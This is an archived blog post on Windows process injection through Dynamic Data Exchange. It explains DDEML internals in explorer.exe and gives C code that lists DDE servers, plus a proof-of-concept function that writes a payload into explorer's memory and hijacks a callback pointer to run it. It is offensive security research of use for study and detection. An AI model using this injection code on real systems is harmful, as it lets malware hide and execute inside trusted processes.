@@ -1,0 +1,506 @@
+# https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/
+
+<!DOCTYPE html><html lang="en">
+
+<body class="wp-singular post-template-default single single-post postid-4351 single-format-standard wp-theme-pubtwentyten customizer-styles-applied single-author jetpack-reblog-enabled">
+<div id="wrapper" class="hfeed">
+	<!-- #header -->
+
+	<div id="main">
+
+		<div id="container">
+			<div id="content" role="main">
+
+			
+
+				<!-- #nav-above -->
+
+				<div id="post-4351" class="post-4351 post type-post status-publish format-standard has-post-thumbnail hentry category-injection category-malware category-process-injection category-programming category-windows tag-breaking-badder tag-dde tag-injection tag-poc tag-windows">
+											<h2 class="entry-title"><a href="https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/" rel="bookmark">Windows Process Injection: Breaking&nbsp;BaDDEr</a></h2>					
+					<div class="entry-meta">
+						<span class="meta-prep meta-prep-author">Posted on</span> <a href="https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/" title="7:00 pm" rel="bookmark"><span class="entry-date">August 9, 2019</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="https://modexp.wordpress.com/author/odzhan/" title="View all posts by odzhan">odzhan</a></span>					</div><!-- .entry-meta -->
+
+					<div class="entry-content">
+						<h2>Introduction</h2>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/dataxchg/about-dynamic-data-exchange">Dynamic Data Exchange</a> (DDE) is a data sharing protocol while the <a href="https://docs.microsoft.com/en-us/windows/win32/dataxchg/dynamic-data-exchange-management-library">Dynamic Data Exchange Management Library</a> (DDEML) facilitates sharing of data among applications over the DDE protocol.  DDE made the headlines in October 2017 after <a href="https://docs.microsoft.com/en-us/security-updates/securityadvisories/2017/4053440">a vulnerability</a> was discovered in Microsoft Office that could be exploited to execute code.  Since then, it’s been disabled by default and is therefore not considered a critical component.  The scope of this injection method is limited to explorer.exe, unless of course you know of other applications that use it.  I’d like to thank <a href="https://twitter.com/Hexacorn">Adam</a> for the discussion about using DDE for injection and also the cheesy name. 😀</p>
+<h2>Enumerating DDE Servers</h2>
+<p>The only DLL that use DDE servers on Windows 10 are shell32.dll, ieframe.dll and twain_32.dll. shell32.dll creates three DDE servers that are hosted by explorer.exe. The following code uses DDEML API to list servers and the process hosting them.</p>
+<pre style="color:#000000;background:#ffffff"><span style="color:#603000">VOID</span> dde_list<span style="color:#808030">(</span><span style="color:#603000">VOID</span><span style="color:#808030">)</span> <span style="color:#800080">{</span>
+    <span style="color:#603000">CONVCONTEXT</span> cc<span style="color:#800080">;</span>
+    <span style="color:#603000">HCONVLIST</span>   cl<span style="color:#800080">;</span>
+    <span style="color:#603000">DWORD</span>       idInst <span style="color:#808030">=</span> <span style="color:#008c00">0</span><span style="color:#800080">;</span>
+    <span style="color:#603000">HCONV</span>       c <span style="color:#808030">=</span> <span style="color:#7d0045">NULL</span><span style="color:#800080">;</span>
+    <span style="color:#603000">CONVINFO</span>    ci<span style="color:#800080">;</span>
+    <span style="color:#603000">WCHAR</span>       server<span style="color:#808030">[</span>MAX_PATH<span style="color:#808030">]</span><span style="color:#800080">;</span>
+    
+    <span style="color:#800000;font-weight:bold">if</span><span style="color:#808030">(</span>DMLERR_NO_ERROR <span style="color:#808030">!</span><span style="color:#808030">=</span> <span style="color:#400000">DdeInitialize</span><span style="color:#808030">(</span><span style="color:#808030">&amp;</span>idInst<span style="color:#808030">,</span> <span style="color:#7d0045">NULL</span><span style="color:#808030">,</span> APPCLASS_STANDARD<span style="color:#808030">,</span> <span style="color:#008c00">0</span><span style="color:#808030">)</span><span style="color:#808030">)</span> <span style="color:#800080">{</span>
+      <span style="color:#603000">printf</span><span style="color:#808030">(</span><span style="color:#800000">"</span><span style="color:#0000e6">unable to initialize : </span><span style="color:#007997">%i</span><span style="color:#0000e6">.</span><span style="color:#0f69ff">\n</span><span style="color:#800000">"</span><span style="color:#808030">,</span> <span style="color:#400000">GetLastError</span><span style="color:#808030">(</span><span style="color:#808030">)</span><span style="color:#808030">)</span><span style="color:#800080">;</span>
+      <span style="color:#800000;font-weight:bold">return</span><span style="color:#800080">;</span>
+    <span style="color:#800080">}</span>
+    
+    <span style="color:#400000">ZeroMemory</span><span style="color:#808030">(</span><span style="color:#808030">&amp;</span>cc<span style="color:#808030">,</span> <span style="color:#800000;font-weight:bold">sizeof</span><span style="color:#808030">(</span>cc<span style="color:#808030">)</span><span style="color:#808030">)</span><span style="color:#800080">;</span>
+    cc<span style="color:#808030">.</span>cb <span style="color:#808030">=</span> <span style="color:#800000;font-weight:bold">sizeof</span><span style="color:#808030">(</span>cc<span style="color:#808030">)</span><span style="color:#800080">;</span>
+    cl <span style="color:#808030">=</span> <span style="color:#400000">DdeConnectList</span><span style="color:#808030">(</span>idInst<span style="color:#808030">,</span> <span style="color:#008c00">0</span><span style="color:#808030">,</span> <span style="color:#008c00">0</span><span style="color:#808030">,</span> <span style="color:#008c00">0</span><span style="color:#808030">,</span> <span style="color:#808030">&amp;</span>cc<span style="color:#808030">)</span><span style="color:#800080">;</span>
+    
+    <span style="color:#800000;font-weight:bold">if</span><span style="color:#808030">(</span>cl <span style="color:#808030">!</span><span style="color:#808030">=</span> <span style="color:#7d0045">NULL</span><span style="color:#808030">)</span> <span style="color:#800080">{</span>
+      <span style="color:#800000;font-weight:bold">for</span><span style="color:#808030">(</span><span style="color:#800080">;</span><span style="color:#800080">;</span><span style="color:#808030">)</span> <span style="color:#800080">{</span>
+        c <span style="color:#808030">=</span> <span style="color:#400000">DdeQueryNextServer</span><span style="color:#808030">(</span>cl<span style="color:#808030">,</span> c<span style="color:#808030">)</span><span style="color:#800080">;</span>
+        <span style="color:#800000;font-weight:bold">if</span><span style="color:#808030">(</span>c <span style="color:#808030">=</span><span style="color:#808030">=</span> <span style="color:#7d0045">NULL</span><span style="color:#808030">)</span> <span style="color:#800000;font-weight:bold">break</span><span style="color:#800080">;</span>
+        ci<span style="color:#808030">.</span>cb <span style="color:#808030">=</span> <span style="color:#800000;font-weight:bold">sizeof</span><span style="color:#808030">(</span>ci<span style="color:#808030">)</span><span style="color:#800080">;</span>
+        <span style="color:#400000">DdeQueryConvInfo</span><span style="color:#808030">(</span>c<span style="color:#808030">,</span> QID_SYNC<span style="color:#808030">,</span> <span style="color:#808030">&amp;</span>ci<span style="color:#808030">)</span><span style="color:#800080">;</span>
+        <span style="color:#400000">DdeQueryString</span><span style="color:#808030">(</span>idInst<span style="color:#808030">,</span> ci<span style="color:#808030">.</span>hszSvcPartner<span style="color:#808030">,</span> server<span style="color:#808030">,</span> MAX_PATH<span style="color:#808030">,</span> CP_WINUNICODE<span style="color:#808030">)</span><span style="color:#800080">;</span>
+        
+        <span style="color:#603000">printf</span><span style="color:#808030">(</span><span style="color:#800000">"</span><span style="color:#0000e6">Service : %-10ws Process : %ws</span><span style="color:#0f69ff">\n</span><span style="color:#800000">"</span><span style="color:#808030">,</span> 
+          server<span style="color:#808030">,</span> wnd2proc<span style="color:#808030">(</span>ci<span style="color:#808030">.</span>hwndPartner<span style="color:#808030">)</span><span style="color:#808030">)</span><span style="color:#800080">;</span>
+      <span style="color:#800080">}</span>
+      <span style="color:#400000">DdeDisconnectList</span><span style="color:#808030">(</span>cl<span style="color:#808030">)</span><span style="color:#800080">;</span>
+    <span style="color:#800080">}</span> <span style="color:#800000;font-weight:bold">else</span> <span style="color:#800080">{</span>
+      <span style="color:#603000">printf</span><span style="color:#808030">(</span><span style="color:#800000">"</span><span style="color:#0000e6">DdeConnectList : </span><span style="color:#007997">%x</span><span style="color:#0f69ff">\n</span><span style="color:#800000">"</span><span style="color:#808030">,</span> <span style="color:#400000">DdeGetLastError</span><span style="color:#808030">(</span>idInst<span style="color:#808030">)</span><span style="color:#808030">)</span><span style="color:#800080">;</span>
+    <span style="color:#800080">}</span>
+    <span style="color:#400000">DdeUninitialize</span><span style="color:#808030">(</span>idInst<span style="color:#808030">)</span><span style="color:#800080">;</span>
+<span style="color:#800080">}</span>
+</pre>
+<h2>DDE Internals</h2>
+<p>Figure 1 shows the decompiled code where the servers are created.</p>
+<div data-shortcode="caption" id="attachment_4354" style="width: 650px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-4354" data-attachment-id="4354" data-permalink="https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/dde_initialize/" data-orig-file="https://modexp.wordpress.com/wp-content/uploads/2019/08/dde_initialize.png" data-orig-size="660,291" data-comments-opened="1" data-image-title="dde_initialize" data-image-description="" data-image-caption="<p>Figure 1. DDE initialization in shell32.dll</p>
+" data-large-file="https://modexp.wordpress.com/wp-content/uploads/2019/08/dde_initialize.png?w=640" src="https://modexp.wordpress.com/wp-content/uploads/2019/08/dde_initialize.png?w=640&amp;h=282" alt="" width="640" height="282" class="size-full wp-image-4354"><p id="caption-attachment-4354" class="wp-caption-text">Figure 1. DDE initialization in shell32.dll</p></div>
+<p><code>user32!DdeInitializeW</code> is where all the interesting stuff occurs. <code>user32!InternalDdeInitialize</code> will allocate memory on the heap for a structure called <code>CL_INSTANCE_INFO</code> which isn’t documented in the public SDK, but you can still find it online.</p>
+<pre style="color:#000000;background:#ffffff"><span style="color:#800000;font-weight:bold">typedef</span> <span style="color:#800000;font-weight:bold">struct</span> tagCL_INSTANCE_INFO <span style="color:#800080">{</span>
+    <span style="color:#800000;font-weight:bold">struct</span> tagCL_INSTANCE_INFO <span style="color:#808030">*</span>next<span style="color:#800080">;</span>
+    <span style="color:#603000">HANDLE</span>                      hInstServer<span style="color:#800080">;</span>
+    <span style="color:#603000">HANDLE</span>                      hInstClient<span style="color:#800080">;</span>
+    <span style="color:#603000">DWORD</span>                       MonitorFlags<span style="color:#800080">;</span>
+    <span style="color:#603000">HWND</span>                        hwndMother<span style="color:#800080">;</span>
+    <span style="color:#603000">HWND</span>                        hwndEvent<span style="color:#800080">;</span>
+    <span style="color:#603000">HWND</span>                        hwndTimeout<span style="color:#800080">;</span>
+    <span style="color:#603000">DWORD</span>                       afCmd<span style="color:#800080">;</span>
+    <span style="color:#603000">PFNCALLBACK</span>                 pfnCallback<span style="color:#800080">;</span>
+    <span style="color:#603000">DWORD</span>                       LastError<span style="color:#800080">;</span>
+    <span style="color:#603000">DWORD</span>                       tid<span style="color:#800080">;</span>
+    LATOM                      <span style="color:#808030">*</span>plaNameService<span style="color:#800080">;</span>
+    <span style="color:#603000">WORD</span>                        cNameServiceAlloc<span style="color:#800080">;</span>
+    PSERVER_LOOKUP              aServerLookup<span style="color:#800080">;</span>
+    <span style="color:#800000;font-weight:bold">short</span>                       cServerLookupAlloc<span style="color:#800080">;</span>
+    <span style="color:#603000">WORD</span>                        ConvStartupState<span style="color:#800080">;</span>
+    <span style="color:#603000">WORD</span>                        flags<span style="color:#800080">;</span>              <span style="color:#696969">// IIF_ flags</span>
+    <span style="color:#800000;font-weight:bold">short</span>                       cInDDEMLCallback<span style="color:#800080">;</span>
+    PLINK_COUNT                 pLinkCount<span style="color:#800080">;</span>
+<span style="color:#800080">}</span> CL_INSTANCE_INFO<span style="color:#808030">,</span> <span style="color:#808030">*</span>PCL_INSTANCE_INFO<span style="color:#800080">;</span>
+</pre>
+<p>The only field we’re interested in is <code>pfnCallback</code>.  The steps to inject are:</p>
+<ol>
+<li>Find the DDE mother window by its registered class name “DDEMLMom”.</li>
+<li>Read the address of <code>CL_INSTANCE_INFO</code> using <code>GetWindowLongPtr</code>.</li>
+<li>Allocate RWX memory in remote process and write payload there.</li>
+<li>Overwrite the function pointer pfncallback with the remote address of payload.</li>
+<li>Trigger execution over DDE.</li>
+</ol>
+<p>Figure 2 shows the properties of the mother window.  As you can see, index zero of the Window Bytes is set. This is the address of <code>CL_INSTANCE_INFO</code>.</p>
+<div data-shortcode="caption" id="attachment_4358" style="width: 390px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-4358" data-attachment-id="4358" data-permalink="https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/win_properties/" data-orig-file="https://modexp.wordpress.com/wp-content/uploads/2019/08/win_properties.png" data-orig-size="380,376" data-comments-opened="1" data-image-title="win_properties" data-image-description="" data-image-caption="<p>Figure 2. Mother Window for DDE server.</p>
+" data-large-file="https://modexp.wordpress.com/wp-content/uploads/2019/08/win_properties.png?w=380" src="https://modexp.wordpress.com/wp-content/uploads/2019/08/win_properties.png?w=640" alt="" class="size-full wp-image-4358"><p id="caption-attachment-4358" class="wp-caption-text">Figure 2. Mother Window for DDE server.</p></div>
+<h2>Injection</h2>
+<p>The following is a PoC to demonstrate the method works.  Full source can be <a href="https://github.com/odzhan/injection/tree/master/dde">found here</a>.</p>
+<pre style="color:#000000;background:#ffffff"><span style="color:#603000">VOID</span> dde_inject<span style="color:#808030">(</span><span style="color:#603000">LPVOID</span> payload<span style="color:#808030">,</span> <span style="color:#603000">DWORD</span> payloadSize<span style="color:#808030">)</span> <span style="color:#800080">{</span>
+    <span style="color:#603000">HWND</span>             hw<span style="color:#800080">;</span>
+    <span style="color:#603000">SIZE_T</span>           rd<span style="color:#808030">,</span> wr<span style="color:#800080">;</span>
+    <span style="color:#603000">LPVOID</span>           ptr<span style="color:#808030">,</span> cs<span style="color:#800080">;</span>
+    <span style="color:#603000">HANDLE</span>           hp<span style="color:#800080">;</span>
+    CL_INSTANCE_INFO pcii<span style="color:#800080">;</span>
+    <span style="color:#603000">CONVCONTEXT</span>      cc<span style="color:#800080">;</span>
+    <span style="color:#603000">HCONVLIST</span>        cl<span style="color:#800080">;</span>
+    <span style="color:#603000">DWORD</span>            pid<span style="color:#808030">,</span> idInst <span style="color:#808030">=</span> <span style="color:#008c00">0</span><span style="color:#800080">;</span>
+    
+    <span style="color:#696969">// 1. find a DDEML window and read the address </span>
+    <span style="color:#696969">//    of CL_INSTANCE_INFO</span>
+    hw <span style="color:#808030">=</span> <span style="color:#400000">FindWindowEx</span><span style="color:#808030">(</span><span style="color:#7d0045">NULL</span><span style="color:#808030">,</span> <span style="color:#7d0045">NULL</span><span style="color:#808030">,</span> <span style="color:#800000">L"</span><span style="color:#0000e6">DDEMLMom</span><span style="color:#800000">"</span><span style="color:#808030">,</span> <span style="color:#7d0045">NULL</span><span style="color:#808030">)</span><span style="color:#800080">;</span>
+    <span style="color:#800000;font-weight:bold">if</span><span style="color:#808030">(</span>hw <span style="color:#808030">=</span><span style="color:#808030">=</span> <span style="color:#7d0045">NULL</span><span style="color:#808030">)</span> <span style="color:#800000;font-weight:bold">return</span><span style="color:#800080">;</span>
+    ptr <span style="color:#808030">=</span> <span style="color:#808030">(</span><span style="color:#603000">LPVOID</span><span style="color:#808030">)</span>GetWindowLongPtr<span style="color:#808030">(</span>hw<span style="color:#808030">,</span> GWLP_INSTANCE_INFO<span style="color:#808030">)</span><span style="color:#800080">;</span>
+    <span style="color:#800000;font-weight:bold">if</span><span style="color:#808030">(</span>ptr <span style="color:#808030">=</span><span style="color:#808030">=</span> <span style="color:#7d0045">NULL</span><span style="color:#808030">)</span> <span style="color:#800000;font-weight:bold">return</span><span style="color:#800080">;</span>
+      
+    <span style="color:#696969">// 2. open the process and read CL_INSTANCE_INFO</span>
+    <span style="color:#400000">GetWindowThreadProcessId</span><span style="color:#808030">(</span>hw<span style="color:#808030">,</span> <span style="color:#808030">&amp;</span>pid<span style="color:#808030">)</span><span style="color:#800080">;</span>
+    hp <span style="color:#808030">=</span> <span style="color:#400000">OpenProcess</span><span style="color:#808030">(</span><span style="color:#7d0045">PROCESS_ALL_ACCESS</span><span style="color:#808030">,</span> FALSE<span style="color:#808030">,</span> pid<span style="color:#808030">)</span><span style="color:#800080">;</span>
+    <span style="color:#800000;font-weight:bold">if</span><span style="color:#808030">(</span>hp <span style="color:#808030">=</span><span style="color:#808030">=</span> <span style="color:#7d0045">NULL</span><span style="color:#808030">)</span> <span style="color:#800000;font-weight:bold">return</span><span style="color:#800080">;</span>
+    <span style="color:#400000">ReadProcessMemory</span><span style="color:#808030">(</span>hp<span style="color:#808030">,</span> ptr<span style="color:#808030">,</span> <span style="color:#808030">&amp;</span>pcii<span style="color:#808030">,</span> <span style="color:#800000;font-weight:bold">sizeof</span><span style="color:#808030">(</span>pcii<span style="color:#808030">)</span><span style="color:#808030">,</span> <span style="color:#808030">&amp;</span>rd<span style="color:#808030">)</span><span style="color:#800080">;</span>
+    
+    <span style="color:#696969">// 3. allocate RWX memory and write payload there.</span>
+    <span style="color:#696969">//    update callback</span>
+    cs <span style="color:#808030">=</span> <span style="color:#400000">VirtualAllocEx</span><span style="color:#808030">(</span>hp<span style="color:#808030">,</span> <span style="color:#7d0045">NULL</span><span style="color:#808030">,</span> payloadSize<span style="color:#808030">,</span> 
+      MEM_RESERVE <span style="color:#808030">|</span> MEM_COMMIT<span style="color:#808030">,</span> PAGE_EXECUTE_READWRITE<span style="color:#808030">)</span><span style="color:#800080">;</span>
+    <span style="color:#400000">WriteProcessMemory</span><span style="color:#808030">(</span>hp<span style="color:#808030">,</span> cs<span style="color:#808030">,</span> payload<span style="color:#808030">,</span> payloadSize<span style="color:#808030">,</span> <span style="color:#808030">&amp;</span>wr<span style="color:#808030">)</span><span style="color:#800080">;</span>
+    <span style="color:#400000">WriteProcessMemory</span><span style="color:#808030">(</span>
+      hp<span style="color:#808030">,</span> <span style="color:#808030">(</span><span style="color:#603000">PBYTE</span><span style="color:#808030">)</span>ptr <span style="color:#808030">+</span> offsetof<span style="color:#808030">(</span>CL_INSTANCE_INFO<span style="color:#808030">,</span> pfnCallback<span style="color:#808030">)</span><span style="color:#808030">,</span> 
+      <span style="color:#808030">&amp;</span>cs<span style="color:#808030">,</span> <span style="color:#800000;font-weight:bold">sizeof</span><span style="color:#808030">(</span><span style="color:#603000">ULONG_PTR</span><span style="color:#808030">)</span><span style="color:#808030">,</span> <span style="color:#808030">&amp;</span>wr<span style="color:#808030">)</span><span style="color:#800080">;</span>
+            
+    <span style="color:#696969">// 4. trigger execution via DDE protocol</span>
+    <span style="color:#400000">DdeInitialize</span><span style="color:#808030">(</span><span style="color:#808030">&amp;</span>idInst<span style="color:#808030">,</span> <span style="color:#7d0045">NULL</span><span style="color:#808030">,</span> APPCLASS_STANDARD<span style="color:#808030">,</span> <span style="color:#008c00">0</span><span style="color:#808030">)</span><span style="color:#800080">;</span>
+    <span style="color:#400000">ZeroMemory</span><span style="color:#808030">(</span><span style="color:#808030">&amp;</span>cc<span style="color:#808030">,</span> <span style="color:#800000;font-weight:bold">sizeof</span><span style="color:#808030">(</span>cc<span style="color:#808030">)</span><span style="color:#808030">)</span><span style="color:#800080">;</span>
+    cc<span style="color:#808030">.</span>cb <span style="color:#808030">=</span> <span style="color:#800000;font-weight:bold">sizeof</span><span style="color:#808030">(</span>cc<span style="color:#808030">)</span><span style="color:#800080">;</span>
+    cl <span style="color:#808030">=</span> <span style="color:#400000">DdeConnectList</span><span style="color:#808030">(</span>idInst<span style="color:#808030">,</span> <span style="color:#008c00">0</span><span style="color:#808030">,</span> <span style="color:#008c00">0</span><span style="color:#808030">,</span> <span style="color:#008c00">0</span><span style="color:#808030">,</span> <span style="color:#808030">&amp;</span>cc<span style="color:#808030">)</span><span style="color:#800080">;</span>
+    <span style="color:#400000">DdeDisconnectList</span><span style="color:#808030">(</span>cl<span style="color:#808030">)</span><span style="color:#800080">;</span>
+    <span style="color:#400000">DdeUninitialize</span><span style="color:#808030">(</span>idInst<span style="color:#808030">)</span><span style="color:#800080">;</span>
+    
+    <span style="color:#696969">// 5. restore original pointer and cleanup</span>
+    <span style="color:#400000">WriteProcessMemory</span><span style="color:#808030">(</span>
+      hp<span style="color:#808030">,</span> 
+      <span style="color:#808030">(</span><span style="color:#603000">PBYTE</span><span style="color:#808030">)</span>ptr <span style="color:#808030">+</span> offsetof<span style="color:#808030">(</span>CL_INSTANCE_INFO<span style="color:#808030">,</span> pfnCallback<span style="color:#808030">)</span><span style="color:#808030">,</span> 
+      <span style="color:#808030">&amp;</span>pcii<span style="color:#808030">.</span>pfnCallback<span style="color:#808030">,</span> <span style="color:#800000;font-weight:bold">sizeof</span><span style="color:#808030">(</span><span style="color:#603000">ULONG_PTR</span><span style="color:#808030">)</span><span style="color:#808030">,</span> <span style="color:#808030">&amp;</span>wr<span style="color:#808030">)</span><span style="color:#800080">;</span>
+          
+    <span style="color:#400000">VirtualFreeEx</span><span style="color:#808030">(</span>hp<span style="color:#808030">,</span> cs<span style="color:#808030">,</span> <span style="color:#008c00">0</span><span style="color:#808030">,</span> MEM_DECOMMIT <span style="color:#808030">|</span> MEM_RELEASE<span style="color:#808030">)</span><span style="color:#800080">;</span>
+    <span style="color:#400000">CloseHandle</span><span style="color:#808030">(</span>hp<span style="color:#808030">)</span><span style="color:#800080">;</span>
+<span style="color:#800080">}</span>
+</pre>
+<div id="jp-post-flair" class="sharedaddy sd-like-enabled sd-sharing-enabled"><div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul data-sharing-events-added="true"><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-4351" class="share-twitter sd-button share-icon" href="https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/?share=twitter&amp;nb=1" target="_blank" aria-labelledby="sharing-twitter-4351">
+				<span id="sharing-twitter-4351">Share on X (Opens in new window)</span>
+				<span>X</span>
+			</a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-4351" class="share-facebook sd-button share-icon" href="https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/?share=facebook&amp;nb=1" target="_blank" aria-labelledby="sharing-facebook-4351">
+				<span id="sharing-facebook-4351">Share on Facebook (Opens in new window)</span>
+				<span>Facebook</span>
+			</a></li><li class="share-end"></li></ul></div></div></div><div class="sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded" id="like-post-wrapper-112159794-4351-6abd031440733" data-src="//widgets.wp.com/likes/index.html?ver=20260930#blog_id=112159794&amp;post_id=4351&amp;origin=modexp.wordpress.com&amp;obj_id=112159794-4351-6abd031440733" data-name="like-post-frame-112159794-4351-6abd031440733" data-title="Like or Reblog"><div class="likes-widget-placeholder post-likes-widget-placeholder" style="height: 55px;"><span class="button"><span>Like</span></span> <span class="loading">Loading...</span></div><span class="sd-text-color"></span><a class="sd-link-color"></a></div>
+<div id="jp-relatedposts" class="jp-relatedposts" style="display: block;">
+	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
+<div class="jp-relatedposts-items jp-relatedposts-items-minimal jp-relatedposts-grid"><p class="jp-relatedposts-post jp-relatedposts-post0" data-post-id="5044" data-post-format="false"><span class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://modexp.wordpress.com/2020/07/31/wpi-cmdline-envar/" title="Windows Process Injection: Command Line and Environment&amp;nbsp;Variables" data-origin="4351" data-position="0">Windows Process Injection: Command Line and Environment&nbsp;Variables</a></span><time class="jp-relatedposts-post-date" datetime="July 31, 2020" style="display: block;">July 31, 2020</time><span class="jp-relatedposts-post-context">In "assembly"</span></p><p class="jp-relatedposts-post jp-relatedposts-post1" data-post-id="3990" data-post-format="false"><span class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://modexp.wordpress.com/2019/04/24/glibc-shellcode/" title="Shellcode: A reverse shell for Linux in C with support for&amp;nbsp;TLS/SSL" data-origin="4351" data-position="1">Shellcode: A reverse shell for Linux in C with support for&nbsp;TLS/SSL</a></span><time class="jp-relatedposts-post-date" datetime="April 24, 2019" style="display: block;">April 24, 2019</time><span class="jp-relatedposts-post-context">In "assembly"</span></p><p class="jp-relatedposts-post jp-relatedposts-post2" data-post-id="5258" data-post-format="false"><span class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://modexp.wordpress.com/2024/09/16/windows_arm64/" title="Shellcode: Windows on ARM64 /&amp;nbsp;AArch64" data-origin="4351" data-position="2">Shellcode: Windows on ARM64 /&nbsp;AArch64</a></span><time class="jp-relatedposts-post-date" datetime="September 16, 2024" style="display: block;">September 16, 2024</time><span class="jp-relatedposts-post-context">In "arm"</span></p></div></div></div>											</div><!-- .entry-content -->
+
+		
+						<div class="entry-utility">
+							This entry was posted in <a href="https://modexp.wordpress.com/category/injection/" rel="category tag">injection</a>, <a href="https://modexp.wordpress.com/category/malware/" rel="category tag">malware</a>, <a href="https://modexp.wordpress.com/category/process-injection/" rel="category tag">process injection</a>, <a href="https://modexp.wordpress.com/category/programming/" rel="category tag">programming</a>, <a href="https://modexp.wordpress.com/category/windows/" rel="category tag">windows</a> and tagged <a href="https://modexp.wordpress.com/tag/breaking-badder/" rel="tag">breaking baDDEr</a>, <a href="https://modexp.wordpress.com/tag/dde/" rel="tag">dde</a>, <a href="https://modexp.wordpress.com/tag/injection/" rel="tag">injection</a>, <a href="https://modexp.wordpress.com/tag/poc/" rel="tag">poc</a>, <a href="https://modexp.wordpress.com/tag/windows/" rel="tag">windows</a>. Bookmark the <a href="https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/" title="Permalink to Windows Process Injection: Breaking&nbsp;BaDDEr" rel="bookmark">permalink</a>.													</div><!-- .entry-utility -->
+					</div><!-- #post-4351 -->
+
+				<!-- #nav-below -->
+
+				
+			<div id="comments">
+
+
+
+	<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">Leave a comment <small><a rel="nofollow" id="cancel-comment-reply-link" href="https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://modexp.wordpress.com/wp-comments-post.php" method="post" id="commentform" class="comment-form">
+
+
+<div class="comment-form__verbum transparent"></div><div class="verbum-form-meta">
+
+
+			
+			</div><p style="display: none;"></p><p style="display: none !important;" class="akismet-fields-container" data-prefix="ak_"><label>Δ<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label>
+</p></form>	</div><!-- #respond -->
+	
+</div><!-- #comments -->
+
+	
+			</div><!-- #content -->
+		</div><!-- #container -->
+
+
+		<div id="primary" class="widget-area" role="complementary">
+						<ul class="xoxo">
+
+<li id="search-6" class="widget-container widget_search"><form role="search" method="get" id="searchform" class="searchform" action="https://modexp.wordpress.com/">
+				<div>
+					<label class="screen-reader-text" for="s">Search for:</label>
+					<input type="text" value="" name="s" id="s">
+					<input type="submit" id="searchsubmit" value="Search">
+				</div>
+			</form></li>
+		<li id="recent-posts-7" class="widget-container widget_recent_entries">
+		<h3 class="widget-title">Recent Posts</h3>
+		<ul>
+											<li>
+					<a href="https://modexp.wordpress.com/2024/09/16/windows_arm64/">Shellcode: Windows on ARM64 /&nbsp;AArch64</a>
+									</li>
+											<li>
+					<a href="https://modexp.wordpress.com/2024/02/13/delegated-nt-dll/">Delegated NT DLL</a>
+									</li>
+											<li>
+					<a href="https://modexp.wordpress.com/2023/04/19/finding-the-wow64-callback-table/">WOW64 Callback Table&nbsp;(FinFisher)</a>
+									</li>
+											<li>
+					<a href="https://modexp.wordpress.com/2022/05/02/shellcode-risc-v-linux/">Shellcode: Linux on RISC-V&nbsp;64-Bit</a>
+									</li>
+											<li>
+					<a href="https://modexp.wordpress.com/2020/07/31/wpi-cmdline-envar/">Windows Process Injection: Command Line and Environment&nbsp;Variables</a>
+									</li>
+											<li>
+					<a href="https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/">MiniDumpWriteDump via COM+ Services&nbsp;DLL</a>
+									</li>
+											<li>
+					<a href="https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/" aria-current="page">Windows Process Injection: Breaking&nbsp;BaDDEr</a>
+									</li>
+											<li>
+					<a href="https://modexp.wordpress.com/2019/07/21/inmem-exec-script/">Shellcode: In-Memory Execution of JavaScript, VBScript, JScript and&nbsp;XSL</a>
+									</li>
+											<li>
+					<a href="https://modexp.wordpress.com/2019/06/24/inmem-exec-dll/">Shellcode: In-Memory Execution of&nbsp;DLL</a>
+									</li>
+											<li>
+					<a href="https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/">Shellcode: Loading .NET Assemblies From&nbsp;Memory</a>
+									</li>
+											<li>
+					<a href="https://modexp.wordpress.com/2019/04/24/glibc-shellcode/">Shellcode: A reverse shell for Linux in C with support for&nbsp;TLS/SSL</a>
+									</li>
+											<li>
+					<a href="https://modexp.wordpress.com/2019/02/02/3883/">How the L0pht (probably) optimized attack against the LanMan&nbsp;hash.</a>
+									</li>
+					</ul>
+
+		</li>			</ul>
+		</div><!-- #primary .widget-area -->
+
+	</div><!-- #main -->
+
+	<!-- #footer -->
+
+</div><!-- #wrapper -->
+
+<!--  -->
+
+
+
+
+
+	
+
+		<div style="display:none">
+	</div>
+			<div id="actionbar" dir="ltr" class="actnbr-pub-twentyten" role="region" aria-label="Site actions">
+			<span class="actnbr-live" aria-live="polite"></span>
+			<ul>
+										<li class="actnbr-btn">
+							<a class="actnbr-action actnbr-actn-comment" href="https://modexp.wordpress.com/2019/08/09/windows-process-injection-breaking-badder/#respond">
+								<svg class="actnbr-icon actnbr-icon-comment" width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" fill="currentColor"><path d="M18 4H6c-1.1 0-2 .9-2 2v12.9c0 .6.5 1.1 1.1 1.1.3 0 .5-.1.8-.3L8.5 17H18c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm.5 11c0 .3-.2.5-.5.5H7.9l-2.4 2.4V6c0-.3.2-.5.5-.5h12c.3 0 .5.2.5.5v9z"></path></svg>								<span>Comment							</span>
+							</a>
+						</li>
+											<li class="actnbr-btn">
